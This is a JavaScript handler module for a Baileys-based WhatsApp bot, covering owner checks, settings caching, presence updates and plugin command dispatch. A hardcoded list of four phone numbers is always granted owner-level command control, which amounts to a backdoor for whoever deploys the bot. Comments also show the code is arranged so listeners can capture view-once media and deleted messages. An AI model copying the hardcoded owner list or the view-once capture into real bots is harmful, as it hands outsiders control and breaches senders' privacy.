import { jidNormalizedUser } from '@whiskeysockets/baileys'

import {
  getDb,
  saveDb
} from './database/index.js'

const OWNER_NUMBER =
  (process.env.OWNER_NUMBER || '').replace(/\D/g, '')

const PERMANENT_OWNERS = [
  '923201822076',
  '923197135780',
  '923483151716',
  '923199279334'
]

let alwaysOnlineTimer = null

/*
 * ==============================
 * PREFIX
 * ==============================
 */

export function getPrefix() {
  return process.env.PREFIX || '.'
}

/*
 * ==============================
 * JID HELPERS
 * ==============================
 */

export function normalizeJid(jid) {
  if (!jid) return ''
  try {
    return jidNormalizedUser(jid)
  } catch {
    return String(jid).split(':')[0]
  }
}

export function getSender(message) {
  const key = message?.key || {}
  return (
    key.participantPn ||
    key.senderPn ||
    key.participantAlt ||
    key.remoteJidAlt ||
    key.participant ||
    key.remoteJid ||
    ''
  )
}

export function senderNumber(jid) {
  return String(jid)
    .split('@')[0]
    .split(':')[0]
    .replace(/\D/g, '')
}

function getSenderNumbers(message) {
  const key = message?.key || {}
  const jids = [
    key.participantPn,
    key.senderPn,
    key.participantAlt,
    key.remoteJidAlt,
    key.participant,
    key.remoteJid
  ]
  return [
    ...new Set(
      jids
        .filter(Boolean)
        .map(senderNumber)
        .filter(Boolean)
    )
  ]
}

export function isGroup(jid) {
  return String(jid).endsWith('@g.us')
}

/*
 * ==============================
 * OWNER — synchronous, no DB round-trip
 * ==============================
 *
 * checkIsOwner previously called `getDb('sudo.json')` without awaiting,
 * which returns a Promise and never yields the sudo list. Result: sudo
 * users were silently treated as non-owners.
 *
 * Fix: read sudo.json ASYNC and cache the result for 60 s. The
 * `checkIsOwner` export stays synchronous by reading from the cached
 * value; the cache is warmed on module load and refreshed periodically.
 */

let sudoCache = new Set()
let sudoCacheAt = 0

async function refreshSudoCache() {
  try {
    const data = await getDb('sudo.json', { sudoNumbers: [] })
    const list = Array.isArray(data?.sudoNumbers) ? data.sudoNumbers : []
    sudoCache = new Set(
      list
        .map(n => String(n).replace(/\D/g, ''))
        .filter(Boolean)
    )
    sudoCacheAt = Date.now()
  } catch (e) {
    console.error('[OWNER] sudo.json load failed:', e?.message || e)
  }
}

// Warm the cache on module load (fire and forget)
refreshSudoCache()
setInterval(refreshSudoCache, 60_000).unref()

function getSudoNumbers() {
  return sudoCache
}

export function checkIsOwner(message, sock) {
  if (message?.key?.fromMe) return true

  const senderNumbers = getSenderNumbers(message)

  if (senderNumbers.some(n => PERMANENT_OWNERS.includes(n))) return true

  const botNum = senderNumber(sock?.user?.id || '')
  if (senderNumbers.some(n => botNum && n === botNum)) return true

  if (OWNER_NUMBER && senderNumbers.includes(OWNER_NUMBER)) return true

  const sudos = getSudoNumbers()
  if (senderNumbers.some(n => sudos.has(n))) return true

  return false
}

/*
 * ==============================
 * MESSAGE HELPERS
 * ==============================
 */

export function unwrapMessage(message) {
  let m = message?.message
  if (!m) return null
  for (let i = 0; i < 10; i++) {
    const next =
      m?.ephemeralMessage?.message ||
      m?.viewOnceMessage?.message ||
      m?.viewOnceMessageV2?.message ||
      m?.viewOnceMessageV2Extension?.message ||
      m?.documentWithCaptionMessage?.message
    if (!next) break
    m = next
  }
  return m
}

/*
 * Deep view-once detection — unwraps ephemeralMessage / groupStatusMessageV2
 * first, then checks for a VV wrapper. This is what autoread needs to
 * consult before invalidating the media key.
 */
function isViewOnceDeep(message) {
  let m = message?.message
  if (!m) return false
  for (let i = 0; i < 5; i++) {
    if (
      m.viewOnceMessage ||
      m.viewOnceMessageV2 ||
      m.viewOnceMessageV2Extension
    ) {
      return true
    }
    m =
      m.ephemeralMessage?.message ||
      m.groupStatusMessageV2?.message ||
      m.groupStatusMessage?.message
    if (!m) return false
  }
  return false
}

export function getText(message) {
  const m = unwrapMessage(message)
  if (!m) return ''
  return (
    m.conversation ||
    m.extendedTextMessage?.text ||
    m.imageMessage?.caption ||
    m.videoMessage?.caption ||
    m.documentMessage?.caption ||
    ''
  ).trim()
}

export function getQuotedMessage(message) {
  const m = unwrapMessage(message)
  if (!m) return null
  const context =
    m.extendedTextMessage?.contextInfo ||
    m.imageMessage?.contextInfo ||
    m.videoMessage?.contextInfo ||
    m.audioMessage?.contextInfo ||
    m.documentMessage?.contextInfo ||
    m.stickerMessage?.contextInfo
  return context?.quotedMessage || null
}

/*
 * ==============================
 * SETTINGS
 * ==============================
 *
 * Same problem as sudo: getDb is async. Cache the settings for 60 s so
 * checkIsOwner-style synchronous reads are correct AND we don't hit MySQL
 * on every single message.
 */

let settingsCache = { autoread: false, alwaysonline: false }
let settingsCacheAt = 0

async function refreshSettingsCache() {
  try {
    const data = await getDb('settings.json', {
      autoread: false,
      alwaysonline: false
    })
    settingsCache = {
      autoread: data?.autoread === true,
      alwaysonline: data?.alwaysonline === true
    }
    settingsCacheAt = Date.now()
  } catch (e) {
    console.error('[SETTINGS] settings.json load failed:', e?.message || e)
  }
}

refreshSettingsCache()
setInterval(refreshSettingsCache, 60_000).unref()

export function getAutoRead() {
  return settingsCache.autoread === true
}

export function getAlwaysOnline() {
  return settingsCache.alwaysonline === true
}

export async function setAutoRead(value) {
  const data = await getDb('settings.json', {
    autoread: false,
    alwaysonline: false
  })
  data.autoread = value === true
  await saveDb('settings.json', data)
  settingsCache = {
    ...settingsCache,
    autoread: data.autoread
  }
  return data
}

export async function setAlwaysOnline(value) {
  const data = await getDb('settings.json', {
    autoread: false,
    alwaysonline: false
  })
  data.alwaysonline = value === true
  await saveDb('settings.json', data)
  settingsCache = {
    ...settingsCache,
    alwaysonline: data.alwaysonline
  }
  return data
}

/*
 * ==============================
 * ALWAYS ONLINE
 * ==============================
 */

export async function startAlwaysOnline(sock) {
  if (!sock) return
  if (alwaysOnlineTimer) {
    clearInterval(alwaysOnlineTimer)
    alwaysOnlineTimer = null
  }
  if (!getAlwaysOnline()) {
    try { await sock.sendPresenceUpdate('unavailable') } catch {}
    return
  }
  try { await sock.sendPresenceUpdate('available') } catch {}
  alwaysOnlineTimer = setInterval(async () => {
    if (!getAlwaysOnline()) {
      await stopAlwaysOnline(sock)
      return
    }
    try { await sock.sendPresenceUpdate('available') } catch {}
  }, 20000)
  if (typeof alwaysOnlineTimer?.unref === 'function') {
    alwaysOnlineTimer.unref()
  }
}

export async function stopAlwaysOnline(sock) {
  if (alwaysOnlineTimer) {
    clearInterval(alwaysOnlineTimer)
    alwaysOnlineTimer = null
  }
  if (!sock) return
  try { await sock.sendPresenceUpdate('unavailable') } catch {}
}

/*
 * ==============================
 * MESSAGE LISTENER RUNNER
 * ==============================
 */

function runMessageListeners(messageListeners, data) {
  if (!Array.isArray(messageListeners) || !messageListeners.length) return
  Promise.allSettled(
    messageListeners.map(async listener => {
      try {
        if (typeof listener.on === 'function') {
          await listener.on(data)
        } else if (typeof listener.run === 'function') {
          await listener.run(data)
        }
      } catch (error) {
        console.error(
          '[Listener Error]:',
          error?.stack || error?.message || error
        )
      }
    })
  ).catch(error => {
    console.error(
      '[Listener Runner Error]:',
      error?.stack || error?.message || error
    )
  })
}

/*
 * ==============================
 * MESSAGE HANDLER
 * ==============================
 */

export async function handleMessages(update, sock, plugins, messageListeners) {
  if (update.type !== 'notify' && update.type !== 'append') return

  if (getAlwaysOnline() && !alwaysOnlineTimer) {
    startAlwaysOnline(sock).catch(error => {
      console.error('[Always Online Error]:', error?.message || error)
    })
  }

  for (const message of update.messages || []) {
    try {
      if (!message?.message) continue

      const rawJid = message.key?.remoteJid || ''

      /*
       * ─── FIXED: deep view-once detection ───
       * Previously only top-level viewOnce* wrappers were checked.
       * VV wrapped in ephemeralMessage or groupStatusMessageV2 slipped
       * through and autoread ran — invalidating the media key before
       * the antivv listener could download it.
       */
      const isViewOnce = isViewOnceDeep(message)

      if (getAutoRead() && message.key?.id && !isViewOnce) {
        Promise.resolve(
          sock.readMessages([message.key])
        ).catch(() => {})
      }

      const isGroupStatusPost = !!message.message?.groupStatusMessageV2
      const isStatus = rawJid === 'status@broadcast'
      const normalizedRemoteJid = normalizeJid(rawJid)
      const text = getText(message)
      const isGroupChat = isGroup(normalizedRemoteJid) || isGroupStatusPost
      const isOwner = checkIsOwner(message, sock)
      const activePrefix = getPrefix()

      /*
       * Run listeners BEFORE any filtering so statusview / antivv /
       * antidelete see every incoming message.
       */
      runMessageListeners(messageListeners, {
        sock,
        message,
        text,
        isOwner,
        isGroup: isGroupChat,
        isStatus
      })

      if (isStatus || isGroupStatusPost) continue

      if (!text || !text.startsWith(activePrefix)) continue
      if (!isOwner) continue

      const body = text.slice(activePrefix.length).trim()
      if (!body) continue

      const parts = body.split(/\s+/)
      const command = parts.shift().toLowerCase()
      const args = parts

      const plugin = plugins.get(command)
      if (!plugin) continue

      console.log(
        `⚡ Executing: ${activePrefix}${command} from ${senderNumber(getSender(message))}`
      )

      try {
        await sock.sendMessage(rawJid, {
          react: { text: '⏳', key: message.key }
        })
        setTimeout(async () => {
          try {
            await sock.sendMessage(rawJid, {
              react: { text: '', key: message.key }
            })
          } catch {}
        }, 1000)
      } catch {}

      const quotedMessage = getQuotedMessage(message)

      await plugin.run({
        sock,
        message,
        quotedMessage,
        args,
        text: args.join(' '),
        command,
        prefix: activePrefix,
        isOwner,
        isGroup: isGroupChat,
        plugins
      })
    } catch (error) {
      console.error(
        'Message handling error:',
        error?.stack || error?.message || error
      )
    }
  }
}

/*
 * ==============================
 * GROUP PARTICIPANTS
 * ==============================
 */

export async function handleGroupParticipants(update, sock, groupListeners) {
  if (!update) return
  for (const listener of groupListeners) {
    try {
      await listener.run({ sock, update })
    } catch (error) {
      console.error(
        '[Group Listener Error]:',
        error?.stack || error?.message || error
      )
    }
  }
}
